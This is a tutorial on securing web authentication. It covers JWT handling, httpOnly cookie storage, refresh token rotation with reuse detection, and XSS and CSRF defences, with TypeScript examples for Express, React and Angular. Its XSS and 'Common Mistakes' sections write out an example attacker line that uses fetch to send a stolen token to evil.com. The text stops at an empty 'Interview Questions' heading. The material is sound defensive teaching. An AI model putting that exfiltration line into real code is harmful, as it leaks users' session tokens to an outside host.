# Authentication Security

## The Idea

**In plain English:** Authentication security is how a website makes sure you are who you say you are — and keeps that proof safe so no one else can steal it and pretend to be you. A "token" is just a digital pass the website gives you after you log in, like a wristband at an event.

**Real-world analogy:** Imagine visiting a theme park. You show your ID at the entrance, get a short-term wristband (valid for the day), and also a special member card locked in your locker (valid for a year). Each ride checks your wristband, not your ID. If your wristband expires, you go back to your locker, get the member card, and swap it for a fresh wristband — without showing your ID again.

- The wristband = the access token (short-lived, used for every request)
- The member card locked in your locker = the refresh token (long-lived, stored in a secure httpOnly cookie JavaScript cannot touch)
- Showing your ID at the entrance = the original login with your username and password

---

## Table of Contents

- [Introduction](#introduction)
- [JWT Security Best Practices](#jwt-security-best-practices)
- [Token Storage](#token-storage)
- [Refresh Token Rotation](#refresh-token-rotation)
- [XSS and CSRF Considerations](#xss-and-csrf-considerations)
- [Token Expiration Strategy](#token-expiration-strategy)
- [Implementation Examples](#implementation-examples)
- [Common Mistakes](#common-mistakes)
- [Best Practices](#best-practices)
- [When to Use/Not to Use](#when-to-usenot-to-use)
- [Interview Questions](#interview-questions)
- [Key Takeaways](#key-takeaways)
- [Resources](#resources)

## Introduction

**Authentication Security** encompasses strategies and best practices for securely implementing user authentication in web applications. This includes token management, secure storage, session handling, and protection against common attacks.

### Authentication Flow Overview

```
┌─────────────────────────────────────────────────────────────┐
│            Secure Authentication Flow                        │
└─────────────────────────────────────────────────────────────┘

1. Login Request
   ┌────────┐                          ┌────────┐
   │ Client │ ── email/password ─────> │ Server │
   └────────┘                          └────────┘

2. Server Validates & Issues Tokens
   ┌────────┐                          ┌────────┐
   │ Client │ <── access + refresh ──── │ Server │
   └────────┘     tokens                └────────┘
               
               Access Token:  Short-lived (15min)
               Refresh Token: Long-lived (7 days)

3. Client Stores Tokens Securely
   ┌────────────────────────────────────┐
   │ Access Token  → Memory/State       │
   │ Refresh Token → httpOnly Cookie    │
   └────────────────────────────────────┘

4. Authenticated Requests
   ┌────────┐                          ┌────────┐
   │ Client │ ── Authorization: ─────> │ Server │
   │        │    Bearer {access}       │        │
   └────────┘                          └────────┘

5. Token Refresh When Expired
   ┌────────┐                          ┌────────┐
   │ Client │ ── refresh token ──────> │ Server │
   │        │ <── new access token ──── │        │
   └────────┘                          └────────┘
```

## JWT Security Best Practices

### JWT Structure and Security

```typescript
// JWT Structure
interface JWT {
  header: {
    alg: string;  // Algorithm (HS256, RS256)
    typ: string;  // Type (JWT)
  };
  payload: {
    sub: string;    // Subject (user ID)
    iat: number;    // Issued at
    exp: number;    // Expiration
    // Custom claims
    email?: string;
    role?: string;
  };
  signature: string; // HMAC or RSA signature
}

// Secure JWT generation
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

class JWTService {
  private readonly accessTokenSecret: string;
  private readonly refreshTokenSecret: string;
  private readonly accessTokenExpiry = '15m';
  private readonly refreshTokenExpiry = '7d';

  constructor() {
    // Use strong, random secrets (never hardcode!)
    this.accessTokenSecret = process.env.ACCESS_TOKEN_SECRET!;
    this.refreshTokenSecret = process.env.REFRESH_TOKEN_SECRET!;

    if (!this.accessTokenSecret || !this.refreshTokenSecret) {
      throw new Error('Token secrets not configured');
    }

    // Verify secret strength
    this.validateSecretStrength(this.accessTokenSecret);
    this.validateSecretStrength(this.refreshTokenSecret);
  }

  private validateSecretStrength(secret: string): void {
    if (secret.length < 32) {
      throw new Error('Token secret must be at least 32 characters');
    }
  }

  generateAccessToken(userId: string, email: string, role: string): string {
    return jwt.sign(
      {
        sub: userId,
        email,
        role,
        type: 'access'
      },
      this.accessTokenSecret,
      {
        expiresIn: this.accessTokenExpiry,
        issuer: 'myapp.com',
        audience: 'myapp.com'
      }
    );
  }

  generateRefreshToken(userId: string): string {
    // Refresh tokens should contain minimal information
    return jwt.sign(
      {
        sub: userId,
        type: 'refresh',
        // Include random jti for token revocation
        jti: crypto.randomBytes(16).toString('hex')
      },
      this.refreshTokenSecret,
      {
        expiresIn: this.refreshTokenExpiry,
        issuer: 'myapp.com',
        audience: 'myapp.com'
      }
    );
  }

  verifyAccessToken(token: string): jwt.JwtPayload {
    try {
      const decoded = jwt.verify(token, this.accessTokenSecret, {
        issuer: 'myapp.com',
        audience: 'myapp.com'
      }) as jwt.JwtPayload;

      if (decoded.type !== 'access') {
        throw new Error('Invalid token type');
      }

      return decoded;
    } catch (error) {
      throw new Error('Invalid or expired access token');
    }
  }

  verifyRefreshToken(token: string): jwt.JwtPayload {
    try {
      const decoded = jwt.verify(token, this.refreshTokenSecret, {
        issuer: 'myapp.com',
        audience: 'myapp.com'
      }) as jwt.JwtPayload;

      if (decoded.type !== 'refresh') {
        throw new Error('Invalid token type');
      }

      return decoded;
    } catch (error) {
      throw new Error('Invalid or expired refresh token');
    }
  }
}
```

### Algorithm Selection

```typescript
// Symmetric vs Asymmetric algorithms

// ❌ BAD: Weak algorithms
const badToken = jwt.sign(payload, secret, { algorithm: 'none' });
const weakToken = jwt.sign(payload, secret, { algorithm: 'HS1' });

// ✓ GOOD: Strong symmetric (shared secret)
const symmetricToken = jwt.sign(payload, secret, { 
  algorithm: 'HS256'  // HMAC with SHA-256
});
// Use case: Single server, simpler setup

// ✓ GOOD: Asymmetric (public/private key)
const privateKey = fs.readFileSync('private.key');
const publicKey = fs.readFileSync('public.key');

const asymmetricToken = jwt.sign(payload, privateKey, { 
  algorithm: 'RS256'  // RSA with SHA-256
});

jwt.verify(asymmetricToken, publicKey, { 
  algorithms: ['RS256']  // Whitelist allowed algorithms
});
// Use case: Microservices, public verification

// Algorithm comparison
const algorithmComparison = {
  'HS256': {
    type: 'Symmetric',
    pros: ['Fast', 'Simple setup', 'Less overhead'],
    cons: ['Shared secret', 'All services need secret'],
    useCase: 'Single application, backend verification only'
  },
  'RS256': {
    type: 'Asymmetric',
    pros: ['Public verification', 'Secret not shared', 'Key rotation'],
    cons: ['Slower', 'More complex', 'Larger tokens'],
    useCase: 'Microservices, third-party verification, APIs'
  }
};
```

## Token Storage

### Storage Options Comparison

```
┌─────────────────────────────────────────────────────────────┐
│              Token Storage Options                           │
└─────────────────────────────────────────────────────────────┘

┌──────────────┬──────────────┬──────────────┬──────────────┐
│   Storage    │   XSS Risk   │  CSRF Risk   │   Use Case   │
├──────────────┼──────────────┼──────────────┼──────────────┤
│ localStorage │    HIGH      │    NONE      │  Avoid!      │
│              │ JS can access│              │              │
├──────────────┼──────────────┼──────────────┼──────────────┤
│ sessionStorage│   HIGH      │    NONE      │  Avoid!      │
│              │ JS can access│              │              │
├──────────────┼──────────────┼──────────────┼──────────────┤
│ Memory/State │    LOW       │    NONE      │  Access token│
│              │ Lost on reload│             │              │
├──────────────┼──────────────┼──────────────┼──────────────┤
│ httpOnly     │    NONE      │    HIGH      │  Refresh     │
│ Cookie       │ JS can't access│ Need CSRF  │  token       │
│              │              │ protection   │              │
├──────────────┼──────────────┼──────────────┼──────────────┤
│ Secure Cookie│    NONE      │    HIGH      │  Both tokens │
│ httpOnly +   │ JS can't access│ Need CSRF  │  (with CSRF) │
│ SameSite     │              │ mitigation   │              │
└──────────────┴──────────────┴──────────────┴──────────────┘

Recommendation: Access token in memory, Refresh token in httpOnly cookie
```

### Secure Token Storage Implementation

```typescript
// Backend: Secure cookie configuration
import express from 'express';

class TokenStorageService {
  setRefreshTokenCookie(res: express.Response, refreshToken: string): void {
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,      // Prevents JavaScript access (XSS protection)
      secure: true,        // HTTPS only
      sameSite: 'strict',  // CSRF protection
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
      path: '/api/auth/refresh', // Limit cookie scope
      domain: process.env.COOKIE_DOMAIN
    });
  }

  clearRefreshTokenCookie(res: express.Response): void {
    res.clearCookie('refreshToken', {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      path: '/api/auth/refresh'
    });
  }

  // Access token sent in response body (stored in memory by client)
  sendTokens(
    res: express.Response,
    accessToken: string,
    refreshToken: string
  ): void {
    // Set refresh token in httpOnly cookie
    this.setRefreshTokenCookie(res, refreshToken);

    // Send access token in response (client stores in memory)
    res.json({
      accessToken,
      tokenType: 'Bearer',
      expiresIn: 900 // 15 minutes
    });
  }
}
```

### React: Token Management

```typescript
// React: Secure token management with Context
import React, { createContext, useContext, useState, useCallback } from 'react';

interface AuthContextType {
  accessToken: string | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
  refreshToken: () => Promise<string>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ 
  children 
}) => {
  // Store access token in memory (NOT localStorage!)
  const [accessToken, setAccessToken] = useState<string | null>(null);

  const login = useCallback(async (email: string, password: string) => {
    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
        credentials: 'include' // Include httpOnly cookie
      });

      if (!response.ok) {
        throw new Error('Login failed');
      }

      const { accessToken } = await response.json();
      setAccessToken(accessToken);
    } catch (error) {
      console.error('Login error:', error);
      throw error;
    }
  }, []);

  const logout = useCallback(async () => {
    try {
      await fetch('/api/auth/logout', {
        method: 'POST',
        credentials: 'include'
      });
    } finally {
      setAccessToken(null);
    }
  }, []);

  const refreshToken = useCallback(async (): Promise<string> => {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include' // Sends httpOnly refresh token cookie
      });

      if (!response.ok) {
        throw new Error('Token refresh failed');
      }

      const { accessToken: newAccessToken } = await response.json();
      setAccessToken(newAccessToken);
      return newAccessToken;
    } catch (error) {
      setAccessToken(null);
      throw error;
    }
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken, login, logout, refreshToken }}>
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
};

// HTTP interceptor for automatic token refresh
export const useAuthenticatedFetch = () => {
  const { accessToken, refreshToken } = useAuth();

  return useCallback(async (
    url: string,
    options: RequestInit = {}
  ): Promise<Response> => {
    // Add access token to request
    const headers = new Headers(options.headers);
    if (accessToken) {
      headers.set('Authorization', `Bearer ${accessToken}`);
    }

    let response = await fetch(url, { ...options, headers });

    // If token expired, refresh and retry
    if (response.status === 401) {
      try {
        const newAccessToken = await refreshToken();
        headers.set('Authorization', `Bearer ${newAccessToken}`);
        response = await fetch(url, { ...options, headers });
      } catch (error) {
        // Refresh failed, redirect to login
        window.location.href = '/login';
        throw error;
      }
    }

    return response;
  }, [accessToken, refreshToken]);
};
```

### Angular: Token Storage Service

```typescript
// Angular: Token management service
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { BehaviorSubject, Observable } from 'rxjs';
import { tap } from 'rxjs/operators';

interface AuthTokens {
  accessToken: string;
  expiresIn: number;
}

@Injectable({
  providedIn: 'root'
})
export class TokenStorageService {
  // Store access token in memory (NOT localStorage)
  private accessToken$ = new BehaviorSubject<string | null>(null);
  private tokenExpiryTimeout: any;

  constructor(private http: HttpClient) {}

  getAccessToken(): string | null {
    return this.accessToken$.value;
  }

  setAccessToken(token: string, expiresIn: number): void {
    this.accessToken$.next(token);
    
    // Auto-refresh before expiry
    this.scheduleTokenRefresh(expiresIn);
  }

  clearAccessToken(): void {
    this.accessToken$.next(null);
    if (this.tokenExpiryTimeout) {
      clearTimeout(this.tokenExpiryTimeout);
    }
  }

  private scheduleTokenRefresh(expiresIn: number): void {
    // Refresh 1 minute before expiry
    const refreshTime = (expiresIn - 60) * 1000;
    
    if (this.tokenExpiryTimeout) {
      clearTimeout(this.tokenExpiryTimeout);
    }

    this.tokenExpiryTimeout = setTimeout(() => {
      this.refreshToken().subscribe({
        error: (err) => {
          console.error('Auto token refresh failed:', err);
          this.clearAccessToken();
        }
      });
    }, refreshTime);
  }

  login(email: string, password: string): Observable<AuthTokens> {
    return this.http.post<AuthTokens>('/api/auth/login', 
      { email, password },
      { withCredentials: true }
    ).pipe(
      tap(response => {
        this.setAccessToken(response.accessToken, response.expiresIn);
      })
    );
  }

  logout(): Observable<void> {
    return this.http.post<void>('/api/auth/logout', {}, 
      { withCredentials: true }
    ).pipe(
      tap(() => this.clearAccessToken())
    );
  }

  refreshToken(): Observable<AuthTokens> {
    return this.http.post<AuthTokens>('/api/auth/refresh', {},
      { withCredentials: true }
    ).pipe(
      tap(response => {
        this.setAccessToken(response.accessToken, response.expiresIn);
      })
    );
  }
}

// HTTP Interceptor
@Injectable()
export class AuthInterceptor implements HttpInterceptor {
  constructor(
    private tokenStorage: TokenStorageService,
    private router: Router
  ) {}

  intercept(
    request: HttpRequest<any>,
    next: HttpHandler
  ): Observable<HttpEvent<any>> {
    const accessToken = this.tokenStorage.getAccessToken();

    if (accessToken) {
      request = request.clone({
        setHeaders: {
          Authorization: `Bearer ${accessToken}`
        }
      });
    }

    return next.handle(request).pipe(
      catchError((error: HttpErrorResponse) => {
        if (error.status === 401) {
          // Try to refresh token
          return this.tokenStorage.refreshToken().pipe(
            switchMap(() => {
              const newToken = this.tokenStorage.getAccessToken();
              const retryRequest = request.clone({
                setHeaders: {
                  Authorization: `Bearer ${newToken}`
                }
              });
              return next.handle(retryRequest);
            }),
            catchError(refreshError => {
              // Refresh failed, redirect to login
              this.router.navigate(['/login']);
              return throwError(() => refreshError);
            })
          );
        }
        return throwError(() => error);
      })
    );
  }
}
```

## Refresh Token Rotation

Refresh token rotation enhances security by issuing a new refresh token with each use.

```typescript
// Backend: Refresh token rotation implementation
interface RefreshTokenRecord {
  userId: string;
  tokenId: string;
  family: string;  // Token family for reuse detection
  expiresAt: Date;
  used: boolean;
  replacedBy?: string;
}

class RefreshTokenManager {
  private tokenStore = new Map<string, RefreshTokenRecord>();

  async createRefreshToken(userId: string): Promise<string> {
    const tokenId = crypto.randomBytes(16).toString('hex');
    const family = crypto.randomBytes(16).toString('hex');
    
    const refreshToken = jwt.sign(
      { sub: userId, jti: tokenId, family },
      process.env.REFRESH_TOKEN_SECRET!,
      { expiresIn: '7d' }
    );

    this.tokenStore.set(tokenId, {
      userId,
      tokenId,
      family,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      used: false
    });

    return refreshToken;
  }

  async rotateRefreshToken(oldToken: string): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    // Verify old refresh token
    const decoded = jwt.verify(
      oldToken,
      process.env.REFRESH_TOKEN_SECRET!
    ) as jwt.JwtPayload;

    const oldTokenRecord = this.tokenStore.get(decoded.jti);

    if (!oldTokenRecord) {
      throw new Error('Refresh token not found');
    }

    // Detect token reuse attack
    if (oldTokenRecord.used) {
      console.error('Token reuse detected!', {
        userId: oldTokenRecord.userId,
        family: oldTokenRecord.family
      });
      
      // Revoke entire token family
      await this.revokeTokenFamily(oldTokenRecord.family);
      throw new Error('Token reuse detected');
    }

    // Mark old token as used
    oldTokenRecord.used = true;

    // Generate new tokens
    const accessToken = this.generateAccessToken(oldTokenRecord.userId);
    const newTokenId = crypto.randomBytes(16).toString('hex');
    
    const refreshToken = jwt.sign(
      { 
        sub: oldTokenRecord.userId, 
        jti: newTokenId,
        family: oldTokenRecord.family  // Keep same family
      },
      process.env.REFRESH_TOKEN_SECRET!,
      { expiresIn: '7d' }
    );

    // Store new token
    this.tokenStore.set(newTokenId, {
      userId: oldTokenRecord.userId,
      tokenId: newTokenId,
      family: oldTokenRecord.family,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      used: false
    });

    // Link old token to new token
    oldTokenRecord.replacedBy = newTokenId;

    return { accessToken, refreshToken };
  }

  private async revokeTokenFamily(family: string): Promise<void> {
    // Revoke all tokens in the family
    for (const [tokenId, record] of this.tokenStore.entries()) {
      if (record.family === family) {
        this.tokenStore.delete(tokenId);
      }
    }
  }

  private generateAccessToken(userId: string): string {
    return jwt.sign(
      { sub: userId },
      process.env.ACCESS_TOKEN_SECRET!,
      { expiresIn: '15m' }
    );
  }
}

// Express endpoint
const refreshTokenManager = new RefreshTokenManager();

app.post('/api/auth/refresh', async (req, res) => {
  try {
    const oldRefreshToken = req.cookies.refreshToken;

    if (!oldRefreshToken) {
      return res.status(401).json({ error: 'No refresh token' });
    }

    const { accessToken, refreshToken } = await refreshTokenManager.rotateRefreshToken(
      oldRefreshToken
    );

    // Set new refresh token cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.json({ accessToken, expiresIn: 900 });
  } catch (error) {
    res.clearCookie('refreshToken');
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### Reuse Detection Flow

```
┌─────────────────────────────────────────────────────────────┐
│         Refresh Token Reuse Detection                        │
└─────────────────────────────────────────────────────────────┘

Normal Flow:
  Token A (family: xyz) → Token B (family: xyz) → Token C (family: xyz)
  Each token used once, then marked as used

Attack Scenario:
  1. Attacker steals Token B
  2. Legitimate user uses Token B → gets Token C
  3. Attacker tries to use Token B (already used!)
  4. Server detects reuse
  5. Server revokes entire family (A, B, C)
  6. Legitimate user forced to re-authenticate

Result: Attack detected, damage minimized
```

## XSS and CSRF Considerations

### XSS Protection for Tokens

```typescript
// Preventing XSS attacks on authentication

class XSSProtection {
  // 1. Never store tokens in localStorage
  static badPractice() {
    // ❌ BAD: Vulnerable to XSS
    localStorage.setItem('token', accessToken);
    
    // Attacker script can steal:
    // const stolen = localStorage.getItem('token');
    // fetch('http://evil.com/steal?token=' + stolen);
  }

  // 2. Use httpOnly cookies for refresh tokens
  static goodPractice(res: express.Response, refreshToken: string) {
    // ✓ GOOD: JavaScript cannot access
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,  // ← Key protection
      secure: true,
      sameSite: 'strict'
    });
  }

  // 3. Store access tokens in memory
  static secureClientStorage() {
    // ✓ GOOD: React state, Angular service
    const [accessToken, setAccessToken] = useState<string | null>(null);
    
    // Lost on page reload, but that's OK
    // User can get new access token via refresh token
  }

  // 4. Sanitize user input
  static sanitizeInput(userInput: string): string {
    return userInput
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }

  // 5. Content Security Policy
  static setCSP(res: express.Response) {
    res.setHeader(
      'Content-Security-Policy',
      "script-src 'self' 'strict-dynamic'; object-src 'none';"
    );
  }
}
```

### CSRF Protection for Authentication

```typescript
// CSRF protection strategies

// 1. SameSite cookies (primary defense)
res.cookie('refreshToken', token, {
  sameSite: 'strict'  // or 'lax'
});

// 2. CSRF tokens for state-changing operations
import csrf from 'csurf';

const csrfProtection = csrf({ 
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  }
});

// Apply to state-changing auth endpoints
app.post('/api/auth/logout', csrfProtection, (req, res) => {
  // Logout logic
});

app.post('/api/auth/password-change', csrfProtection, (req, res) => {
  // Password change logic
});

// 3. Custom request headers (CORS preflight)
// Client must send custom header (not possible in simple CSRF)
app.post('/api/auth/sensitive', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Process request
});

// React: Send custom header
fetch('/api/auth/sensitive', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  credentials: 'include'
});
```

## Token Expiration Strategy

### Optimal Token Lifetimes

```
┌─────────────────────────────────────────────────────────────┐
│           Token Expiration Strategy                          │
└─────────────────────────────────────────────────────────────┘

Access Token:
  Lifetime: 15 minutes - 1 hour
  Storage: Memory/State
  Purpose: API authentication
  
  Short lifetime because:
  - If stolen, limited window for abuse
  - Stored in memory (lost on tab close)
  - Easily refreshable

Refresh Token:
  Lifetime: 7 days - 30 days
  Storage: httpOnly cookie
  Purpose: Obtain new access tokens
  
  Longer lifetime because:
  - Reduces user login frequency
  - Protected by httpOnly flag
  - Rotation on each use
  - Can be revoked server-side

Session Token (alternative):
  Lifetime: Until logout or 24 hours idle
  Storage: httpOnly cookie
  Purpose: Server-side session management
  
  Use when:
  - Need server-side session state
  - Want immediate revocation
  - Stateful architecture
```

### Implementation

```typescript
// Token expiration management
class TokenExpirationManager {
  private readonly ACCESS_TOKEN_EXPIRY = 15 * 60; // 15 minutes
  private readonly REFRESH_TOKEN_EXPIRY = 7 * 24 * 60 * 60; // 7 days
  private readonly REFRESH_BUFFER = 60; // Refresh 1 min before expiry

  generateTokens(userId: string): {
    accessToken: string;
    refreshToken: string;
    expiresIn: number;
  } {
    const accessToken = jwt.sign(
      { sub: userId },
      process.env.ACCESS_TOKEN_SECRET!,
      { expiresIn: this.ACCESS_TOKEN_EXPIRY }
    );

    const refreshToken = jwt.sign(
      { sub: userId, jti: crypto.randomBytes(16).toString('hex') },
      process.env.REFRESH_TOKEN_SECRET!,
      { expiresIn: this.REFRESH_TOKEN_EXPIRY }
    );

    return {
      accessToken,
      refreshToken,
      expiresIn: this.ACCESS_TOKEN_EXPIRY
    };
  }

  shouldRefreshToken(token: string): boolean {
    try {
      const decoded = jwt.decode(token) as jwt.JwtPayload;
      if (!decoded || !decoded.exp) return true;

      const expiresAt = decoded.exp * 1000;
      const now = Date.now();
      const timeUntilExpiry = expiresAt - now;

      // Refresh if less than buffer time remaining
      return timeUntilExpiry < this.REFRESH_BUFFER * 1000;
    } catch {
      return true;
    }
  }

  getTokenExpiry(token: string): Date | null {
    try {
      const decoded = jwt.decode(token) as jwt.JwtPayload;
      if (!decoded || !decoded.exp) return null;
      return new Date(decoded.exp * 1000);
    } catch {
      return null;
    }
  }
}

// React: Auto-refresh implementation
const AutoTokenRefresh: React.FC = () => {
  const { accessToken, refreshToken } = useAuth();
  const tokenManager = useMemo(() => new TokenExpirationManager(), []);

  useEffect(() => {
    if (!accessToken) return;

    // Check if token needs refresh
    const interval = setInterval(() => {
      if (tokenManager.shouldRefreshToken(accessToken)) {
        refreshToken().catch(error => {
          console.error('Auto-refresh failed:', error);
        });
      }
    }, 60000); // Check every minute

    return () => clearInterval(interval);
  }, [accessToken, refreshToken, tokenManager]);

  return null;
};
```

## Common Mistakes

### 1. Storing Tokens in localStorage

```typescript
// ❌ BAD: Vulnerable to XSS
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', refreshToken);

// Attacker can steal tokens with:
const stolen = localStorage.getItem('accessToken');
fetch('http://evil.com/steal?token=' + stolen);

// ✓ GOOD: Memory + httpOnly cookie
const [accessToken, setAccessToken] = useState<string | null>(null);
res.cookie('refreshToken', refreshToken, { httpOnly: true });
```

### 2. Long-Lived Access Tokens

```typescript
// ❌ BAD: Access token valid for 30 days
const accessToken = jwt.sign(payload, secret, { expiresIn: '30d' });
// If stolen, attacker has 30 days of access

// ✓ GOOD: Short-lived access token
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = jwt.sign(payload, secret, { expiresIn: '7d' });
```

### 3. Not Validating Token Claims

```typescript
// ❌ BAD: Only verify signature
const decoded = jwt.verify(token, secret);

// ✓ GOOD: Validate all claims
const decoded = jwt.verify(token, secret, {
  issuer: 'myapp.com',
  audience: 'myapp.com',
  algorithms: ['HS256']  // Whitelist algorithms
});

// Additional validation
if (decoded.type !== 'access') {
  throw new Error('Invalid token type');
}

if (decoded.exp < Date.now() / 1000) {
  throw new Error('Token expired');
}
```

### 4. No Token Revocation Mechanism

```typescript
// ❌ BAD: No way to revoke tokens
// Once issued, token valid until expiry

// ✓ GOOD: Token revocation with blacklist
class TokenBlacklist {
  private blacklist = new Set<string>();

  revokeToken(tokenId: string, expiresAt: Date): void {
    this.blacklist.add(tokenId);
    
    // Auto-remove after expiry
    setTimeout(() => {
      this.blacklist.delete(tokenId);
    }, expiresAt.getTime() - Date.now());
  }

  isRevoked(tokenId: string): boolean {
    return this.blacklist.has(tokenId);
  }
}

// Check blacklist on each request
app.use((req, res, next) => {
  const token = extractToken(req);
  const decoded = jwt.verify(token, secret);
  
  if (tokenBlacklist.isRevoked(decoded.jti)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  next();
});
```

### 5. Weak JWT Secrets

```typescript
// ❌ BAD: Weak or hardcoded secrets
const secret = 'secret123';
const secret = process.env.JWT_SECRET || 'default-secret';

// ✓ GOOD: Strong, random secrets
// Generate strong secret:
const secret = crypto.randomBytes(64).toString('hex');

// In .env file:
// ACCESS_TOKEN_SECRET=<64-character-random-string>
// REFRESH_TOKEN_SECRET=<different-64-character-random-string>

// Validate secret strength on startup
if (!process.env.ACCESS_TOKEN_SECRET || 
    process.env.ACCESS_TOKEN_SECRET.length < 32) {
  throw new Error('ACCESS_TOKEN_SECRET must be at least 32 characters');
}
```

## Best Practices

### 1. Implement Comprehensive Token Management

```typescript
// Complete authentication system
class AuthenticationService {
  private jwtService: JWTService;
  private tokenStorage: RefreshTokenManager;
  private blacklist: TokenBlacklist;

  async login(email: string, password: string): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    // 1. Validate credentials
    const user = await this.validateCredentials(email, password);

    // 2. Generate tokens
    const accessToken = this.jwtService.generateAccessToken(
      user.id,
      user.email,
      user.role
    );
    const refreshToken = await this.tokenStorage.createRefreshToken(user.id);

    // 3. Log login event
    await this.auditLog.logLogin(user.id, email);

    return { accessToken, refreshToken };
  }

  async refresh(oldRefreshToken: string): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    // 1. Validate and rotate refresh token
    const tokens = await this.tokenStorage.rotateRefreshToken(oldRefreshToken);

    // 2. Check blacklist
    const decoded = jwt.decode(tokens.refreshToken) as jwt.JwtPayload;
    if (this.blacklist.isRevoked(decoded.jti)) {
      throw new Error('Token revoked');
    }

    return tokens;
  }

  async logout(refreshToken: string): Promise<void> {
    // 1. Revoke refresh token
    const decoded = jwt.verify(
      refreshToken,
      process.env.REFRESH_TOKEN_SECRET!
    ) as jwt.JwtPayload;
    
    const expiry = new Date(decoded.exp! * 1000);
    this.blacklist.revokeToken(decoded.jti, expiry);

    // 2. Log logout event
    await this.auditLog.logLogout(decoded.sub);
  }

  async validateAccessToken(token: string): Promise<jwt.JwtPayload> {
    // 1. Verify signature and claims
    const decoded = this.jwtService.verifyAccessToken(token);

    // 2. Check blacklist
    if (this.blacklist.isRevoked(decoded.jti)) {
      throw new Error('Token revoked');
    }

    // 3. Additional validation
    await this.validateUser(decoded.sub);

    return decoded;
  }

  private async validateUser(userId: string): Promise<void> {
    // Check if user still exists and is active
    const user = await this.userRepository.findById(userId);
    if (!user || !user.isActive) {
      throw new Error('User not found or inactive');
    }
  }
}
```

### 2. Secure Token Transmission

```typescript
// Always use HTTPS in production
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});

// Set security headers
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});
```

### 3. Rate Limiting for Auth Endpoints

```typescript
// Protect against brute force attacks
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

const refreshLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20, // More lenient for refresh
  message: 'Too many refresh attempts'
});

app.post('/api/auth/login', loginLimiter, loginHandler);
app.post('/api/auth/refresh', refreshLimiter, refreshHandler);
```

### 4. Audit Logging

```typescript
// Track authentication events
class AuditLogger {
  async logLogin(userId: string, email: string, req: express.Request) {
    await this.log({
      event: 'LOGIN',
      userId,
      email,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date()
    });
  }

  async logFailedLogin(email: string, req: express.Request) {
    await this.log({
      event: 'LOGIN_FAILED',
      email,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date()
    });

    // Check for brute force
    await this.checkBruteForce(email, req.ip);
  }

  async logTokenRefresh(userId: string) {
    await this.log({
      event: 'TOKEN_REFRESH',
      userId,
      timestamp: new Date()
    });
  }

  async logLogout(userId: string) {
    await this.log({
      event: 'LOGOUT',
      userId,
      timestamp: new Date()
    });
  }

  async logTokenReuse(userId: string, family: string) {
    await this.log({
      event: 'TOKEN_REUSE_DETECTED',
      userId,
      family,
      severity: 'HIGH',
      timestamp: new Date()
    });

    // Alert security team
    await this.alertSecurityTeam('Token reuse detected', { userId, family });
  }
}
```

## When to Use/Not to Use

### JWT-Based Authentication

**Use when:**
- Stateless architecture preferred
- Microservices need to validate tokens independently
- Mobile apps (avoid session management)
- Third-party API access
- Scalability is priority

**Avoid when:**
- Need immediate token revocation
- Highly sensitive operations (banking)
- Server-side session state acceptable
- Simple monolithic application

### Session-Based Authentication

**Use when:**
- Need immediate revocation
- Sensitive operations require tight control
- Monolithic architecture
- Server-side state acceptable
- Simpler mental model preferred

### Token Storage Decision Tree

```
┌─────────────────────────────────────────────────────────────┐
│         Token Storage Decision                               │
└─────────────────────────────────────────────────────────────┘

Is XSS a concern?
  ├─ Yes → Use httpOnly cookies
  │         (Requires CSRF protection)
  │
  └─ No → Still use httpOnly cookies
          (XSS should always be a concern)

Need to survive page reload?
  ├─ Yes → Refresh token in httpOnly cookie
  │         Access token in memory (refresh on load)
  │
  └─ No → Both tokens in memory
          (User re-authenticates on reload)

Cross-domain authentication?
  ├─ Yes → Consider Authorization header
  │         (Avoid cookie issues)
  │
  └─ No → httpOnly cookies work great
```

## Interview Questions

